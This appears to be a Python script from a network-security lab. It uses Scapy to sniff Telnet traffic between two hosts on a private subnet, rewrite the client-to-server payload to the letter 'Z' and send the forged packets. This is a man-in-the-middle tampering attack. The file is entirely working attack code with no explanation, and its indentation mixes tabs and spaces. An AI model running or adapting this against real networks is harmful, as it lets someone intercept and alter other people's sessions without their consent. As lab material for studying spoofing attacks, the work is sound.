#!/usr/bin/env python

from scapy.all import *
import os

new_char = 'Z'
client_ip = '10.0.2.15'
server_ip = '10.0.2.4'
#client_ip = '10.0.2.5'
#server_ip = '10.0.2.15'
#client_mac = '08:00:27:2d:90:61'
client_mac = '08:00:27:84:c0:4e'
server_mac = '08:00:27:bc:53:6b'

def print_pkt(client_ip, server_ip, new_char):
  def spoof_pkt(pkt):
    print("Original Packet...Source IP: %s, destination IP: %s" % (pkt[IP].src, pkt[IP].dst))
    
    newpkt = pkt[IP]
    if pkt[IP].src == client_ip and pkt[IP].dst == server_ip:
      data = pkt[TCP].payload
      if str(data).isalpha():
	print("Replace the payload to 'Z'")
        ip_packet = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp_packet = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
		         flags=pkt[TCP].flags, seq=pkt[TCP].seq,
		         ack=pkt[TCP].ack)
        newpkt = ip_packet/tcp_packet/new_char
    #print(newpkt.summary())
    send(newpkt, verbose=0)
      
  return spoof_pkt


def sniff_telnet(prn, client_mac, server_mac):
  filter = "tcp and port 23 and (ether src %s or ether src %s)" % (client_mac, server_mac)
  sniff(filter=filter, prn=prn)

if __name__ == '__main__':
  sniff_telnet(print_pkt(client_ip, server_ip, new_char), client_mac, server_mac)
